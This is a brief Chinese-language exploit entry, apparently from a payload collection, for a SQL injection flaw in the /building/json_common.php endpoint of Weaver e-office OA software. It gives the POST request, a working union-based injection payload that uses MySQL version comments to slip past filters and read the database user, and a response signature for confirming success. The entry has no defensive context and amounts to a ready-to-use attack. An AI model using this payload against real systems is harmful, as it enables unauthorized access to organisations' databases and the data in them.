# 泛微OAe-officejson_common.phpSQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **请求**：`POST /building/json_common.php HTTP/1.1`

**Payload**
```
tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,user() ,4#2333
```
- **响应特征**：200 @